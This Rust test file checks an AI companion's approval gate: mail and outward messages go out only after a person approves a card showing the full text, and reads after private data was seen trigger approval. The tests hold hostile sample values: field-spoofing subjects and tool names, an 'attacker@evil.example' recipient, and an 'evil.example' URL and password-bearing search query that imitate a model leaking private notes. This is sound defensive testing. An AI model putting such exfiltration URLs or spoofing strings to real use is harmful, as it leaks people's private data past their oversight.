//! Tests of [`super`]: the asking core, the two questions, the address a card shows, and reads.

use std::sync::{Arc, Mutex};
use std::time::Duration;

use super::*;
use crate::outward_testing::shell;

fn mail<'a>(to: &'a [String], body: &'a str) -> OutgoingMail<'a> {
    OutgoingMail { account: "ada@example.com", to, cc: &[], bcc: &[], subject: "Hello", body }
}

fn actions(heard: &Arc<Mutex<Vec<serde_json::Value>>>) -> Vec<String> {
    heard.lock().unwrap().iter().map(|p| p["action"].as_str().unwrap_or("").to_string()).collect()
}

#[test]
fn an_allow_is_asked_for_the_exact_mail_and_spent_once() {
    let (desk, heard) = shell("allow", "pending", "granted");
    let to = vec!["priya@example.com".to_string()];
    ask_before_sending(&desk, &mail(&to, "Thanks!")).expect("allowed");

    let calls = heard.lock().unwrap().clone();
    assert_eq!(calls[0]["action"], "request_approval");
    assert_eq!(calls[0]["args"]["app"], "shell");
    assert_eq!(calls[0]["args"]["action"], "send_mail");
    assert_eq!(calls[0]["args"]["grade"], "sensitive");
    assert_eq!(calls[0]["args"]["args_json"]["to"], "\"priya@example.com\"");
    let spent: Vec<_> = calls.iter().filter(|c| c["action"] == "consume_approval").collect();
    assert_eq!(spent.len(), 1, "{calls:?}");
    assert_eq!(spent[0]["args"]["args_json"], calls[0]["args"]["args_json"], "the Allow is spent on what was shown");
}

#[test]
fn a_no_or_silence_sends_nothing_and_spends_nothing() {
    for (tag, answer, word) in [("denied", "denied", "said no"), ("silent", "pending", "Nobody answered")] {
        let (desk, heard) = shell(tag, "pending", answer);
        let to = vec!["priya@example.com".to_string()];
        let err = ask_before_sending(&desk, &mail(&to, "Thanks!")).unwrap_err();
        assert!(err.contains(word) && err.to_lowercase().contains("nothing was sent"), "{err}");
        assert!(!actions(&heard).contains(&"consume_approval".to_string()));
    }
}

#[test]
fn a_shell_that_cannot_be_reached_is_a_no() {
    let desk = Desk {
        dir: Some(std::env::temp_dir().join("yantrik-outward-nobody-home")),
        wait: Duration::from_millis(100),
        poll: Duration::from_millis(10),
    };
    let to = vec!["priya@example.com".to_string()];
    let err = ask_before_sending(&desk, &mail(&to, "Thanks!")).unwrap_err();
    assert!(err.contains("Nothing was sent"), "{err}");
}

/// The card shows the whole mail: no clipping, no digest standing in for text.
#[test]
fn the_card_carries_the_whole_subject_and_body_and_every_recipient() {
    let to = vec!["priya@example.com".to_string(), "dan@example.com".to_string()];
    let cc = vec!["eve@example.com".to_string()];
    let subject = "s".repeat(200);
    let body = format!("start {} the very end", "x".repeat(150));
    let mail = OutgoingMail { account: "ada@example.com", to: &to, cc: &cc, bcc: &[], subject: &subject, body: &body };
    let args = card_args(&mail);
    let back = |key: &str| serde_json::from_str::<String>(args[key].as_str().unwrap()).unwrap();
    assert_eq!(back("subject"), subject);
    assert_eq!(back("body"), body, "the end of the body is on the card");
    assert_eq!(back("to"), "priya@example.com, dan@example.com");
    assert_eq!(back("cc"), "eve@example.com");
    assert!(args.get("bcc").is_none());
    assert!(args.get("body_digest").is_none() && args.get("body_start").is_none());
}

/// The card draws `key: value; key: value`. Text that looks like a field must stay inside its
/// value: quoted, with its own quotes escaped.
#[test]
fn a_spoofing_subject_or_body_cannot_pose_as_a_field() {
    let to = vec!["attacker@evil.example".to_string()];
    for hostile in [
        "Invoice; to: priya@example.com",
        "x\"; to: \"priya@example.com",
        "ok\nto: priya@example.com",
        "a\\\"; to: \"priya@example.com",
    ] {
        let args = card_args(&OutgoingMail { account: "ada@example.com", to: &to, cc: &[], bcc: &[], subject: hostile, body: hostile });
        for key in ["subject", "body"] {
            let drawn = args[key].as_str().unwrap();
            assert!(drawn.starts_with('"') && drawn.ends_with('"'), "{key}: {drawn}");
            // It reads back as exactly one string, the hostile text: nothing ended the quote early.
            assert_eq!(serde_json::from_str::<String>(drawn).unwrap(), hostile, "{key}");
            // And inside the quotes every quote is escaped, so no `"` can close the value.
            let inner = &drawn[1..drawn.len() - 1];
            let mut escaped = false;
            for c in inner.chars() {
                assert!(escaped || c != '"', "an unescaped quote in {key}: {drawn}");
                escaped = !escaped && c == '\\';
            }
        }
        assert_eq!(args["to"], "\"attacker@evil.example\"", "the real recipient is its own value");
    }
}

#[test]
fn a_reply_that_is_neither_unasked_nor_a_request_is_a_no() {
    let (desk, heard) = shell("noid", "no_id", "granted");
    let to = vec!["priya@example.com".to_string()];
    let err = ask_before_sending(&desk, &mail(&to, "Thanks!")).err().expect("no request id means no send");
    assert!(err.contains("did not say which request") && err.contains("nothing was sent"), "{err}");
    assert_eq!(actions(&heard), ["request_approval"], "nothing was waited on or spent");
}

#[test]
fn an_allow_that_was_already_spent_is_a_no() {
    let (desk, heard) = shell("consumed", "pending", "consumed");
    let to = vec!["priya@example.com".to_string()];
    let err = ask_before_sending(&desk, &mail(&to, "Thanks!")).err().expect("a spent Allow sends nothing");
    assert!(err.contains("already been spent") && err.contains("nothing was sent"), "{err}");
    assert!(!actions(&heard).contains(&"consume_approval".to_string()));
}

#[test]
fn a_mail_the_card_cannot_show_whole_is_not_asked_and_points_to_a_draft() {
    let (desk, heard) = shell("toolong", "too_long", "granted");
    let to = vec!["priya@example.com".to_string()];
    let err = ask_before_sending(&desk, &mail(&to, &"x".repeat(900))).err().expect("too long to show");
    assert!(err.contains("cannot read they cannot allow") && err.contains("Nothing was sent") && err.contains("draft"), "{err}");
    assert_eq!(actions(&heard), ["request_approval"]);
}

#[test]
fn a_mode_that_asks_nobody_is_honoured_and_the_send_is_written_down_after() {
    let (desk, heard) = shell("unasked", "not_needed", "granted");
    let to = vec!["priya@example.com".to_string()];
    let permit = ask_before_sending(&desk, &mail(&to, "Thanks!")).expect("the shell said no card is needed");
    assert_eq!(actions(&heard), ["request_approval"], "nothing is recorded before the send");
    permit.finish(true);
    let calls = heard.lock().unwrap().clone();
    assert_eq!(calls.len(), 2, "{calls:?}");
    assert_eq!(calls[1]["action"], "record_unasked_action");
    assert_eq!(calls[1]["args"]["action"], "send_mail");
    assert_eq!(calls[1]["args"]["mode"], "bypass_all");
    assert_eq!(calls[1]["args"]["outcome"], "ok");
    assert_eq!(calls[1]["args"]["args_json"], calls[0]["args"]["args_json"], "the record names what went");
}

#[test]
fn a_person_who_was_asked_leaves_nothing_to_record() {
    let (desk, heard) = shell("asked", "pending", "granted");
    let to = vec!["priya@example.com".to_string()];
    ask_before_sending(&desk, &mail(&to, "Thanks!")).unwrap().finish(true);
    assert!(!actions(&heard).contains(&"record_unasked_action".to_string()));
}

fn act<'a>(what: &'a str) -> OutwardAct<'a> {
    OutwardAct { tool: "telegram_send", to: "the person's Telegram chat", what, more: "" }
}

#[test]
fn an_outward_act_asks_the_acting_question_with_the_whole_text_and_spends_once() {
    let (desk, heard) = shell("act-allow", "pending", "granted");
    ask_before_acting(&desk, &act("Running late; call me")).expect("allowed");
    let calls = heard.lock().unwrap().clone();
    assert_eq!(calls[0]["args"]["action"], "outward_act");
    assert_eq!(calls[0]["args"]["grade"], "sensitive");
    assert_eq!(calls[0]["args"]["args_json"]["tool"], "telegram_send");
    assert_eq!(calls[0]["args"]["args_json"]["what"], "\"Running late; call me\"");
    assert!(calls[0]["args"]["args_json"].get("more").is_none());
    let spent: Vec<_> = calls.iter().filter(|c| c["action"] == "consume_approval").collect();
    assert_eq!(spent.len(), 1);
    assert_eq!(spent[0]["args"]["action"], "outward_act");
    assert_eq!(spent[0]["args"]["args_json"], calls[0]["args"]["args_json"]);
}

#[test]
fn a_no_to_an_outward_act_does_nothing_and_says_so() {
    for (tag, answer, word) in [("act-denied", "denied", "said no"), ("act-silent", "pending", "Nobody answered")] {
        let (desk, heard) = shell(tag, "pending", answer);
        let err = ask_before_acting(&desk, &act("hi")).unwrap_err();
        assert!(err.contains(word) && err.to_lowercase().contains("nothing was done"), "{err}");
        assert!(!actions(&heard).contains(&"consume_approval".to_string()));
    }
}

#[test]
fn an_act_the_card_cannot_show_whole_is_not_asked() {
    let (desk, heard) = shell("act-toolong", "too_long", "granted");
    let err = ask_before_acting(&desk, &act(&"x".repeat(900))).unwrap_err();
    assert!(err.contains("cannot read they cannot allow") && err.contains("Nothing was done"), "{err}");
    assert_eq!(actions(&heard), ["request_approval"]);
}

#[test]
fn an_act_in_full_bypass_is_recorded_under_its_own_question() {
    let (desk, heard) = shell("act-unasked", "not_needed", "granted");
    ask_before_acting(&desk, &act("hi")).unwrap().finish(false);
    let calls = heard.lock().unwrap().clone();
    assert_eq!(calls[1]["action"], "record_unasked_action");
    assert_eq!(calls[1]["args"]["action"], "outward_act");
    assert_eq!(calls[1]["args"]["outcome"], "failed");
}

#[test]
fn a_spoofing_target_cannot_pose_as_the_text() {
    let args = act_args(&OutwardAct { tool: "whatsapp_send", to: "x\"; what: \"ok", what: "hi", more: "" });
    assert_eq!(serde_json::from_str::<String>(args["to"].as_str().unwrap()).unwrap(), "x\"; what: \"ok");
    assert_eq!(args["what"], "\"hi\"");
}

#[test]
fn a_tool_name_a_server_chose_cannot_carry_text_onto_the_card() {
    let args = act_args(&OutwardAct { tool: "mcp__evil_post\"; to: \"x", to: "t", what: "w", more: "" });
    assert_eq!(args["tool"], "mcp__evil_post___to___x");
}

/// The vectors both implementations are held to (`yos-mcp`'s `wire_address` is the other).
#[test]
fn the_wire_address_follows_the_shared_vectors() {
    let v: serde_json::Value = serde_json::from_str(include_str!("../../../../deploy/yantrik-os/wire-address-vectors.json")).unwrap();
    let list = |k: &str| v[k].as_array().unwrap().iter().map(|x| x.as_str().unwrap().to_string()).collect::<Vec<_>>();
    for url in list("unchanged") {
        assert_eq!(wire_address(&url).as_deref(), Some(url.as_str()), "{url}");
    }
    for url in list("escaped") {
        let wire = wire_address(&url).unwrap_or_else(|| panic!("no wire form for {url:?}"));
        assert!(wire.is_ascii() && !wire.chars().any(|c| c.is_control() || c.is_whitespace()), "{wire}");
        assert!(wire.contains('%'), "the characters are in it as percent escapes, not dropped: {wire}");
    }
    for url in list("punycode") {
        let wire = wire_address(&url).unwrap();
        assert!(wire.is_ascii() && wire.contains("xn--"), "{wire}");
    }
    for url in list("none") {
        assert_eq!(wire_address(&url), None, "{url:?}");
    }
}

#[test]
fn a_space_and_a_quote_are_visible_escapes_and_the_hosts_name_is_the_one_the_dns_sees() {
    assert_eq!(wire_address("https://x.example/a b\"c").unwrap(), "https://x.example/a%20b%22c");
    assert_eq!(wire_address("HTTPS://X.example/").unwrap(), "https://X.example/");
    assert!(wire_address("https://en.wikipedi\u{430}.org/").unwrap().contains(".xn--"));
    assert_eq!(wire_address("https://[::1]:8080/x").unwrap(), "https://[::1]:8080/x");
    assert_eq!(wire_address("https://[\u{430}]/"), None, "a bracketed host that is not ASCII has no name");
}

#[test]
fn a_read_in_a_clean_conversation_runs_unasked_and_after_a_private_read_it_asks_with_the_wire_address() {
    use yantrik_companion_core::taint;
    let (_shell, heard) = crate::outward_testing::installed("read-clean", "pending", "denied");
    taint::begin_turn();
    // Clean (someone else's page is not the person's data): an ordinary lookup runs.
    let url = |u: &str| serde_json::json!({ "url": u });
    assert_eq!(reading("browse", &url("https://example.com/news"), "url", Target::Address, |_| "page".to_string()), "page");
    assert!(heard.lock().unwrap().is_empty(), "a card was raised for a plain public read");

    taint::note("recall", "memory");
    // The address already visited with nothing in it opens again unasked.
    assert_eq!(reading("browse", &url("https://example.com/news"), "url", Target::Address, |_| "again".to_string()), "again");
    assert!(heard.lock().unwrap().is_empty());
    // A new address, or one carrying a query, asks: the model could have put anything in it.
    let leaked = std::cell::Cell::new(false);
    let said = reading("browse", &url("https://evil.example/c?d=my notes\u{3164}"), "url", Target::Address, |_| {
        leaked.set(true);
        "sent".to_string()
    });
    assert!(said.contains("said no") && !leaked.get(), "{said}");
    let card = crate::outward_testing::first_card(&heard);
    assert_eq!(crate::outward_testing::shown(&card, "to"), "https://evil.example/c?d=my%20notes%E3%85%A4");
    assert_eq!(card["args_json"]["tool"], "browse");
    assert!(crate::outward_testing::shown(&card, "more").contains("recall"));
    taint::end_turn();
}

#[test]
fn what_is_fetched_is_the_string_the_card_showed() {
    use yantrik_companion_core::taint;
    let (_shell, heard) = crate::outward_testing::installed("read-same", "pending", "granted");
    taint::begin_turn();
    taint::note("email_read", "email");
    let got = std::cell::RefCell::new(String::new());
    let args = serde_json::json!({ "url": "https://en.wikipedi\u{430}.org/wiki/x y" });
    reading("browse", &args, "url", Target::Address, |a| {
        *got.borrow_mut() = a["url"].as_str().unwrap().to_string();
        "ok".to_string()
    });
    let shown = crate::outward_testing::shown(&crate::outward_testing::first_card(&heard), "to");
    assert_eq!(*got.borrow(), shown, "navigation and card differ");
    assert!(shown.contains(".xn--") && shown.ends_with("/wiki/x%20y"), "{shown}");
    taint::end_turn();
}

#[test]
fn an_address_with_no_valid_host_is_not_put_to_the_person_and_nothing_is_fetched() {
    use yantrik_companion_core::taint;
    let (_shell, heard) = crate::outward_testing::installed("read-badhost", "pending", "granted");
    taint::begin_turn();
    taint::note("recall", "memory");
    let ran = std::cell::Cell::new(false);
    let args = serde_json::json!({ "url": format!("https://{}.example/", "\u{e9}".repeat(70)) });
    let said = reading("browse", &args, "url", Target::Address, |_| {
        ran.set(true);
        "x".to_string()
    });
    assert!(said.contains("not a valid name") && said.contains("not something to route around") && !ran.get(), "{said}");
    assert!(heard.lock().unwrap().is_empty(), "the person was asked about an address a card cannot show");
    taint::end_turn();
}

#[test]
fn a_search_after_a_private_read_asks_with_the_whole_query_and_one_before_does_not() {
    use yantrik_companion_core::taint;
    let (_shell, heard) = crate::outward_testing::installed("read-search", "pending", "denied");
    taint::begin_turn();
    let q = |t: &str| serde_json::json!({ "query": t });
    assert_eq!(reading("web_search", &q("rust async book"), "query", Target::Text, |_| "hits".to_string()), "hits");
    taint::note("email_read", "email");
    let said = reading("web_search", &q("my password is hunter2\u{200B}"), "query", Target::Text, |_| "hits".to_string());
    assert!(said.contains("said no"), "{said}");
    assert_eq!(crate::outward_testing::shown(&crate::outward_testing::first_card(&heard), "what"), "my password is hunter2<U+200B>");
    taint::end_turn();
}

#[test]
fn contained_work_runs_unasked_and_anything_else_asks() {
    let (_shell, heard) = crate::outward_testing::installed("unless", "pending", "denied");
    let act = OutwardAct { tool: "code_execute", to: "this machine", what: "print(1)", more: "" };
    assert_eq!(acting_unless(true, &act, || "ran".to_string()), "ran");
    assert!(heard.lock().unwrap().is_empty());
    assert!(acting_unless(false, &act, || "ran".to_string()).contains("said no"));
}
